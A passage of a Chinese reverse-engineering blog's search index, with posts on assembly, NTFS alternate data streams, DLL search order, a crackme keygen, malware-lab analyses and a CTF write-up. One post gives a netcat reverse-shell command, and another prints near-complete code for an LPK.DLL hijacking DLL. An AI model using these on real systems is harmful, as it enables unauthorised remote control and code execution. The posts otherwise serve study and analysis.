ds:[40705B]\n","tags":["逆向"],"categories":["逆向"]},{"title":"汇编知识学习","url":"/2017/08/06/编程/汇编知识学习/","content":"\n1.MOVSX  带符号扩展指令\n\n\tMOV BL,80H   \n\tMOVSX  AX,BL\n\tAX=0FF80H\n\t因为带符号扩展的时候，高位视为符号位，扩展的高位全置1\n\n2.neg eax  sbb eax ,eax\n\n\t例如 \n\tneg r\n\tsbb r-r\n\tneg eax 就是0-eax 其实际上就是设置标志位 cf=1 \n\tsbb eax,eax 就是eax-eax-cf\n\t如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1\n\t相当于r-r-cf=-1=oxffffffff\n\t注意：\n\t MOVzX  无符号扩展指令\n\n\n3.test 指令\n\n\ttest eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je  xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je  xxxx\n\n4.__alloca_probe\n\n\t逆向vc编译的程序，经常会看到这样的代码出现在函数头部：\n\t\n\tmov     eax, xxxxh\n\tcall    __alloca_probe\n\t\n\txxxxh是个立即数，一般大于1000h,即十进制数4096。\n\t\n\t这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。\n\t\n\t示例1：\n\t                 push    ebp\n\t                 mov     ebp, esp\n\t                 mov     eax, 8080h\n\t                 call    __alloca_probe\n\t                 \n\t示例2：\n\t                 push    ebp\n\t                 mov     ebp, esp\n\t                 and     esp, 0FFFFFFF8h\n\t                 push    0FFFFFFFFh\n\t                 push    offset SEH_4A7AA0\n\t                 mov     eax, large fs:0\n\t                 push    eax\n\t                 mov     large fs:0, esp\n\t                 push    ecx\n\t                 mov     eax, 8080h\n\t                 call    __alloca_probe\n\t                 \n\t事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。\n\n5.chkstk函数\n\n\t分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间\n\n\n​\t\n​\t我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,\n​\teax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。\n\n6.JGE.JLE,JNE,JE跳转条件\n\n\tJGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转\n\n7.字符串入栈的操作：\n\n\tvoid main(){\n\t01361000  push        ebp  \n\t01361001  mov         ebp,esp  \n\t01361003  sub         esp,0Ch    //栈顶抬高12个字节\n\t01361006  mov         eax,dword ptr [___security_cookie (1363000h)]  \n\t0136100B  xor         eax,ebp  \n\t0136100D  mov         dword ptr [ebp-4],eax    //用了4个字节\n\t  int intA;\n\t  char ch[5]=\"abcd\";\n\t01361010  mov         eax,dword ptr [string \"abcd\" (136210Ch)] \n\t01361015  mov         cl,byte ptr ds:[1362110h]    //两句传送字符串”abcd\\0”到寄存器\n\t  intA=15;\n\t  fun(intA,ch);\n\t0136101B  lea         edx,[ebp-0Ch] //\n\t0136101E  push        edx    //数组地址,ch[]\n\t0136101F  push        0Fh    //立即数参数,15\n\t01361021  push        offset string \"Integer:%d String:%s\" (13620F4h)  \n\t01361026  mov         dword ptr [ebp-0Ch],eax  \n\t01361029  mov         byte ptr [ebp-8],cl    //两句语句表示”abcd\\0”写入栈中\n\t0136102C  call        dword ptr [__imp__printf (13620A0h)]  //调用printf\n\t}\n\tcl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。\n\n8.atoi 函数 \n\n\t字符串转变为数字\n","tags":["编程"],"categories":["编程"]},{"title":"数据隐藏-ADS","url":"/2017/08/06/逆向/数据隐藏-ADS/","content":"\n\nNTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。\n\n详见[ADS](https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin)\n","tags":["逆向"],"categories":["逆向"]},{"title":"进程替换的一种方式","url":"/2017/08/06/逆向/进程替换的一种检测方式/","content":"\n进程替换问题\n\nsvchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。\n\n![](http://i.imgur.com/3u192lY.png)\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"netcat-反向shell","url":"/2017/08/06/黑客工具/netcat—反向shell/","content":"\n利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell\n\n1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe\n\n2.linux 主机执行 nc  -l  -p 80\n\n3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。","tags":["黑客工具"],"categories":["黑客工具"]},{"title":"dll加载和劫持","url":"/2017/08/03/逆向/dll加载和劫持/","content":"\n一.dll加载顺序\n\n1. DLL查找路径基础\n\n&emsp;&emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。\n\n&emsp;&emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载：\n\n&emsp;&emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）\n\n&emsp;&emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。\n\n&emsp;&emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个\"找不到模块\"的错误。\n\n\n2.系统标准DLL查找顺序\n\n&emsp;&emsp;系统使用的标准DLL查找顺序依赖于是否设置了\"安全DLL查找模式\"（safe DLL search mode）。\"安全DLL查找模式\"会将用户当前目录置于查找顺序的后边。\n\"安全DLL查找模式\"默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用\"安全DLL查找模式\"，并修改DLL查找顺序。\nWindows XP下，\"安全DLL查找模式\"默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。\"安全DLL查找模式\"从Windows XP SP2开始，默认是启用的。\n\n\n&emsp;&emsp;启用\"安全DLL查找模式\"时，查找顺序如下：\n\n* a . 应用程序所在目录；\n*\nb. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nc. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\nd. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\ne. 当前目录。GetCurrentDirectory返回的目录；\nf. 环境变量PATH中所有目录。\n\n如果\"安全DLL查找模式\"被禁用，查找顺序如下：\na. 应用程序所在目录；\nb. 当前目录。GetCurrentDirectory返回的目录；\nc. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nd. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\ne. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\nf. 环境变量PATH中所有目录。\n\n3. 修改系统DLL查找顺序\n系统使用的标准DLL查找顺序可以通过以下两种方式调整：\n3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；\n这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将\"查找应用程序所在目录\"修改为lpFileName指定的目录。\n3.2 调用SetDllDirectory函数。\n注意：SetDllDirectory函数在Windows XP SP1开始支持的。\n函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：\na. 应用程序所在目录；\nb. 函数SetDllDirectory参数lpPathName给定的目录；\nc. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nd. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\ne. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\nf. 环境变量PATH中所有目录。\n如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。\n如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的\"安全DLL查找模式\"来查找DLL。\n\n当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。\n\n4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。\n\t\n\t#include <windows.h>\n\t#include <iostream>\n\t\n\tint main(int argc, char ** argv)\n\t{\n\t    using std::cout;\n\t    using std::endl;\n\t    \n\t    // 随便设置一个不存在的dll名\n\t    HMODULE hMod = LoadLibrary(\"123.dll\");\n\t\n\t    if (NULL != hMod)\n\t        FreeLibrary(hMod);\n\t        \n\t    cout << \"LoadLibrary Test\" << endl;\n\t    \n\t    return 0;\n\t}\n5.通过process monitor 实际测试win10 64位发现加载顺序是\n\t•  应用程序所在目录\n\t• 系统目录（首先是c:\\Windows\\SysWOW64；然后是c:\\Windows\\System）\n\t• windows目录\n\t• 当前目录\n\t• 环境变量path目录\n\n二  dll 劫持\n\n&emsp;&emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。\n\n&emsp;&emsp;●DLL劫持的实现●\n这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下：\n\n* 1 、构造一个与系统目录下LPK.DLL一样的导出表；\n\n* 2、加载系统目录下的LPK.DLL；\n\n* 3、将导出函数转发到系统目录下的LPK.DLL上；\n\n* 4、在初始化函数中加入我们要执行的代码。\n\n我们使用VC++来进行开发，首先是定义导出函数。核心代码如下：\n\n\n\t#pragma comment(linker, \"/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1\")\n\t#pragma comment(linker, \"/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2\")\n\t#pragma comment(linker, \"/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3\")\n\t#pragma comment(linker, \"/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4\")\n\t#pragma comment(linker, \"/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6\")\n\t#pragma comment(linker, \"/EXPORT:LpkGetCharacterPlacement=\n\t_gamehacker_LpkGetCharacterPlacement,@7\")\n\t#pragma comment(linker, \"/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8\")\n\t#pragma comment(linker, \"/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9\")\n\t#pragma comment(linker, \"/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10\")\n\t#pragma comment(linker, \"/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11\")\n\n以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下：\n\n\t★\n\tEXTERNC void __cdecl gamehacker_LpkEditControl(void);   \n\tEXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = {gamehacker_LpkEditControl};  \n\t★\nLpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。\n加载系统目录下的LPK.DLL。核心代码如下：\n\t★\n\t inline BOOL WINAPI Load()\n\t {\n\t  TCHAR tzPath[MAX_PATH];\n\t  TCHAR tzTemp[MAX_PATH * 2];\n\t  \n\t  GetSystemDirectory(tzPath, MAX_PATH);\n\t  lstrcat(tzPath, TEXT(\"\\\\lpk\"));\n\t  m_hModule=LoadLibrary(tzPath);  \n\t  return (m_hModule != NULL); \n\t }\n\t★\n在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。\n首先要获得原函数地址。核心代码如下：\n\n\t★\n\t FARPROC WINAPI GetAddress(PCSTR pszProcName)\n\t {\n\t  FARPROC fpAddress;\n\t  CHAR szProcName[16];\n\t  TCHAR tzTemp[MAX_PATH];\n\t  \n\t  fpAddress = GetProcAddress(m_hModule, pszProcName);  \n\t  return fpAddress;\n\t }\n\t★\n\n然后将我们构造的导出函数一一转发。核心代码如下：\n\n\t★\n\tALCDECL gamehacker_LpkInitialize(void)\n\t{\n\t GetAddress(\"LpkInitialize\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkTabbedTextOut(void)\n\t{\n\t GetAddress(\"LpkTabbedTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkDllInitialize(void)\n\t{\n\t GetAddress(\"LpkDllInitialize\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkDrawTextEx(void)\n\t{\n\t GetAddress(\"LpkDrawTextEx\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkEditControl(void)\n\t{\n\t GetAddress(\"LpkEditControl\");\n\t __asm jmp DWORD ptr [EAX];\n\t}\n\tALCDECL gamehacker_LpkExtTextOut(void)\n\t{\n\t GetAddress(\"LpkExtTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkGetCharacterPlacement(void)\n\t{\n\t GetAddress(\"LpkGetCharacterPlacement\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkGetTextExtentExPoint(void)\n\t{\n\t GetAddress(\"LpkGetTextExtentExPoint\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkPSMTextOut(void)\n\t{\n\t GetAddress(\"LpkPSMTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkUseGDIWidthCache(void)\n\t{\n\t GetAddress(\"LpkUseGDIWidthCache\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_ftsWordBreak(void)\n\t{\n\t GetAddress(\"ftsWordBreak\");\n\t __asm JMP EAX;\n\t}\n\t★\n转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：\n★\n memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(\"LpkEditControl\") + 1),52);  \n★\n好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。\n\n\t★\n\tBOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)\n\t{\n\t if (dwReason == DLL_PROCESS_ATTACH)\n\t {\n\t  DisableThreadLibraryCalls(hModule);\n\t  if(Load())\n\t  {  \n\t   memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(\"LpkEditControl\") + 1),52);  \n\t   _beginthread(Init,NULL,NULL);\n\t  }\n\t  else\n\t   return FALSE;\n\t }\n\t else if (dwReason == DLL_PROCESS_DETACH)\n\t {\n\t  Free();\n\t }\n\t return TRUE;\n\t}\n\t★\n\n在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。\n下面在初始化函数Init中写入测试代码如下：\n\n\t★\n\tvoid WINAPIV Init(LPVOID pParam);\n\tvoid WINAPIV Init(LPVOID pParam)\n\t{\n\t TCHAR tzPath[MAX_PATH];\n\t TCHAR tzTemp[MAX_PATH * 2];\n\t  wsprintf(tzTemp, TEXT(\"劫持函数运行了.......\"), tzPath);\n\t   MessageBox(NULL, tzTemp, TEXT(\"gamehacker\"), MB_ICONSTOP);\n\t return; \n\t} \n\t★\n","tags":["逆向"],"categories":["逆向"]},{"title":"一个简单的crackme","url":"/2017/08/01/逆向/一个简单的crackme/","content":"\n\n一、样本基本信息\n\n程序链接    http://pan.baidu.com/s/1bSPUdK\n\n二、分析过程\n\n这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。\n\n打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。\n\n![](http://i.imgur.com/zNx08T2.png)\n\n寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，\n\n![](http://i.imgur.com/L7OC3u0.png)\n\n继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，\n\n![](http://i.imgur.com/XvyRwWc.png)\n\n重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序，\n\n![](http://i.imgur.com/6LollUw.png)\n\n\n程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80,\n\n![](http://i.imgur.com/xWA8wmF.png)\n\n\n然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00,\n\n![](http://i.imgur.com/KF1WoYi.png)\n\n然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235，\n\n![](http://i.imgur.com/SM4q3Fu.png)\n\n继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数__vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax=0x31即ax=31,最后得到edi的值为6*0x17cfb+0x31=0x8ee13,然后程序调用__vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。\n\n![](http://i.imgur.com/s7GXTIj.png)\n\n   4.转化为c代码为：\n\t#include<stdio.h>\n\t#include<stdlib.h>\n\t#include<string.h>\n\tint main()\n\t{\n\t\tchar name[10];\n\t\tint len=0,key=0;\n\t\tscanf(\"%s\",&name);\n\t\tlen=strlen(name);\n\t\tkey=len*0x17cfb+name[0];\n\t\tprintf(\"AKA-\");\n\t\tprintf(\"%d\\n\",key);\n\t\tsystem(\"pause\");\n\t\treturn 0;\n\t}\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码分析第二记","url":"/2017/08/01/逆向/恶意代码分析第二记/","content":"\n一、样本基本信息\n\n.样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll.\n\n二、分析过程\n\n首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp.\n\n![img](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/wiWLOYN.png)\n\n![img](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/3SglnDX.png)\n\n然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。\n\n![](http://i.imgur.com/NPtmzMv.png)\n\n![](http://i.imgur.com/pa6CXX9.png)\n\n查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。\n对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对'C:\\Windows\\System32\\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到'C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。\n\n![](http://i.imgur.com/9bkmJL4.png)\n![](http://i.imgur.com/w91FP9E.png)\n![](http://i.imgur.com/1Tw8cLs.png)\n\n然后我们对lab07-03.dll进行静态ida反汇编看一下。dll的代码就很简单了，首先创建互斥体保证只有一个再运行，然后建立socket网络连接，ip是127.26.152.13，端口是80，首先 发送hello,并且利用shutdown()函数关闭套接字的写功能，然后就是recv进行监听了，如果受到的字符串是sleep就睡眠60秒，如果是exec那就是远程执行，创建进程，命令行参数此时未知。\n\n![](http://i.imgur.com/VzM4RLc.png)\n下一步就是验证我们的猜想，在命令行加上正确的参数运行程序，构建好模拟网路和监控工具。\n![](http://i.imgur.com/w9wS2Qg.png)\n![](http://i.imgur.com/KOWwJp5.png)\n\n如图看到了文件映射的操作，以及大量的遍历操作，跟我们通过反汇编得到的结果几乎一致。\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码分析第一记","url":"/2017/08/01/逆向/恶意代码分析第一记/","content":"\n一、样本基本信息\n\n分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe\n\n二、分析过程\n\n首先在虚拟机里准备好必要的工具，\n静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。\n\n动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。\n\n- 静态分析步骤：\n\n\n•     PEID 查壳\n\n![img](https://i.imgur.com/4usSk9D.png)\n\t\n发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。\n\t\n• PEVIew\n\n抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数,\n\n![img](https://i.imgur.com/OhjexaS.png)\n\n• Strings\n\n用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。\n\n![img](https://i.imgur.com/wbTQjEZ.png)\n\n​\t\n\n- 动态分析步骤\n\n首先运行process monitor、process explorer、ApateDNS、regshot等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。\n\n![img](https://i.imgur.com/q2coLee.png)\n\n在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。\n\n![img](https://i.imgur.com/jVOp29K.png)\n","tags":["逆向"],"categories":["逆向"]},{"title":"迷路CTF","url":"/2017/08/01/逆向/迷路/","content":"\n步骤如下\n\n1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi\n\n2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。）\n\n![](http://i.imgur.com/60iDg8y.png)\n\n3  打开OD载入程序，搜索字符串，发现关键字符串，很高兴。\n\n![](http://i.imgur.com/J9OcWmh.png)\n\n\n在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。\n\n![](http://i.imgur.com/gT8tpJM.png)\n\n继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。\n\n\n4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：\n\n![](http://i.imgur.com/k7dqhuI.png)\n\n复制到可执行文件，保存文件。再次运行发现果然出现了两个输入按钮。\n\n5.修改后的程序重新加载进OD，此时发现感觉没什么思路，对获取输入字符串的函数进行下断点，在IDA中发现有GetWindowText函数，双加该函数，ctrl+x 获取其引用的位置，记下地址，在OD中ctrl+g 查找，找到该函数位置下断点，重新运行程序，输入字符串，点击左边的Input,程序运行到断点处，F8单步运行，发现下面有一个call ,F7进去看看，发现是获取字符串的长度，感觉好多Crackme都会对字符串的长度进行检查，于是对存字符串的位置下一个内存访问断点，看看是否有什么意外的惊喜，F9运行程序，发现程序到了这，IDA查看此位置的反编译结果，发现果然是对字符串的长度进行了检查，0x27u说明字符串长度为39,79，79,67,84,70,123,125刚好是题目所说的格式00CTF{},继续运行寻找返回的地方。最后回到401f96的位置，此处果然为一个调用，检查长度和格式。如果不符合返回值为0，跳到失败的位置。符合的话返回值为1，继续往下进行。\n\n![](http://i.imgur.com/EoKNATC.png)\n\n![](http://i.imgur.com/HQGVXkP.png)\n\n6 继续往下分析，分析各个call 的作用，发现call 1.00401860 位置的call 有很大的嫌疑，里面有各种循环，猜测为算法处理过程，IDA定位此处位置分析基本确定此位置，继续向下运行，查找字符串比较的过程，发现地址为401fca的调用，是弹出错错误的位置，此处下断点，重新运行程序到这个位置，F7进去分析，同时打开IDA，定位此函数，辅助分析，果然发现了两个MessageBOXA函数。分析不同的弹框结果发现前面是一个字符串比较函数，IDA按table键定位此函数的位置。\n\n![](http://i.imgur.com/O2ZMscC.png)\t\n\n进去发现是一个一个进行字符的比较，比较字符串b5h760h64R867618bBwB48BrW92H4w5r  错误的话最后函数返回值为1，弹出错误对话框。\n\t\n7.现在的问题就只剩下解决算法出路的问题了。IDA反编译出的代码如下\n\n![](http://i.imgur.com/bvyHkdm.png)\n\n分析可知其对数字不做变换，大写字母减去65然后再进行关键操作，\nV9=(V6+V5*V7)%26+((V6+V5*V7)%26<0?0X1a:0)\nv6在调试的时候会出现32-2-2=28，v5情况有点复杂，可能是3或者5，待会再说为什么，小写字母减去97然后进行关键操作，这样就进行了字符串的变换。\n关于v6的问题：该数值最早是函数0041458e 的返回值，返回值为-1的时候就赋值为3，否则为原数。我用3进行测试的时候发现是错误的，那这个函数0041458e 就很有问题。\n在此处下断点，F7进去发现是再次调用了函数41459c,继续跟进去同时观察IDA的结果，\n\n![](http://i.imgur.com/B0LOlTZ.png)\n\n发现其实就是判断_mbschr((const unsigned __int8 *)(a3 + *(_DWORD *)this),a2))的结果，点击该函数进去，OD定位该位置，单步运行会发现，其实是检查输入字符串的第六位是否为0，如果为0则返回 